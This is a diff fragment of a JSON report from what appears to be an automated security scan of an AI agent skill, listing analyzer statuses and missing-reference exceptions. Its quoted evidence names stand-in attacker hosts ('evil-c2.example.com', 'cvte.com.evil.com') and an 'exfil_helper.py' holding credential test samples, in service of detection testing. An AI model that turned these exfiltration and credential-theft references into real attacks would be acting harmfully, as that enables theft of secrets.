+    "total_components": 2,
+    "scanned_components": 2,
+    "coverage_percent": 100.0,
+    "is_complete": true,
+    "status": "complete_with_caveats",
+    "execution_successful": true,
+    "fully_inspected_files": 2,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "ledger_exceptions": [
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_missing",
+        "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+        "path": "SKILL.md",
+        "start_line": 23,
+        "end_line": 23,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_missing",
+        "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+        "path": "SKILL.md",
+        "start_line": 30,
+        "end_line": 30,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_missing",
+        "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+        "path": "SKILL.md",
+        "start_line": 31,
+        "end_line": 31,
+        "fatal": false
+      }
+    ],
+    "scope_exclusions": [],
+    "analyzer_statuses": [
+      {
+        "analyzer_id": "artifact_integrity",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "behavioral_ast",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "behavioral_taint_tracking",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "bundled_execution_surface",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "mcp_least_privilege",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "mcp_rug_pull",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "mcp_tool_poisoning",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "meta_analyzer",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "semantic_developer_intent",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "semantic_quality_policy",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "semantic_security_discovery",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "static_patterns_agent_snooping",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_anti_refusal",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_data_exfiltration",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_deserialization",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_excessive_agency",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_harmful_content",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_memory_poisoning",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_output_handling",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_privilege_escalation",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_prompt_injection",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_rogue_agent",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_ssrf",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_supply_chain",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_system_prompt_leakage",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_tool_misuse",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_yara",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      }
+    ],
+    "references": [
+      {
+        "source_path": "SKILL.md",
+        "line": 23,
+        "column": 13,
+        "evidence": "- **\u89c4\u5219 B**\uff08`cvte_credential_inline.yar`\uff09\uff1a\u660e\u6587\u51ed\u8bc1\u6b63\u6837\u672c\u5e94\u547d\u4e2d HIGH\uff0c\u5360\u4f4d\u7b26/\u73af\u5883\u53d8\u91cf\u8d1f\u6837\u672c\u5e94\u653e\u884c\u3002",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial",
+        "reference_kind": "quoted_or_code"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 30,
+        "column": 9,
+        "evidence": "> \u975e\u767d\u540d\u5355 `evil-c2.example.com`\u3001\u88f8\u57df\u540d `cvte.com`\uff08`*.` \u53ea\u5339\u914d\u5b50\u57df\u540d\uff09\u3001",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial",
+        "reference_kind": "quoted_or_code"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 30,
+        "column": 35,
+        "evidence": "> \u975e\u767d\u540d\u5355 `evil-c2.example.com`\u3001\u88f8\u57df\u540d `cvte.com`\uff08`*.` \u53ea\u5339\u914d\u5b50\u57df\u540d\uff09\u3001",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial",
+        "reference_kind": "quoted_or_code"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 31,
+        "column": 7,
+        "evidence": "> \u9677\u9631 `cvte.com.evil.com`\uff08\u540e\u7f00\u662f `evil.com`\uff09\u3002",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial",
+        "reference_kind": "quoted_or_code"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 31,
+        "column": 31,
+        "evidence": "> \u9677\u9631 `cvte.com.evil.com`\uff08\u540e\u7f00\u662f `evil.com`\uff09\u3002",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial",
+        "reference_kind": "quoted_or_code"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 74,
+        "column": 11,
+        "evidence": "\u4e0a\u8ff0\u903b\u8f91\u5df2\u5c01\u88c5\u5230 `exfil_helper.py`\uff08\u542b Python \u4fa7 URL userinfo / \u8fde\u63a5\u4e32 / \u73af\u5883\u53d8\u91cf\u51ed\u8bc1\u6837\u672c\uff09\uff0cAgent \u53ef\u76f4\u63a5\u8c03\u7528\uff1a",
+        "target_path": "exfil_helper.py",
+        "status": "resolved",
+        "disposition": "analyzed",
+        "reference_kind": "quoted_or_code"
+      }
+    ],
+    "limitations": [],
+    "findings_before_filtering": 12,
+    "findings_after_filtering": 12,
+    "dependency_inspection": {
+      "enabled": false,
+      "status": "not_requested",
+      "mode": "static_local",
+      "locked_entries": 0,
+      "inspected_artifacts": 0,
+      "artifacts": []
+    }
+  }
+}
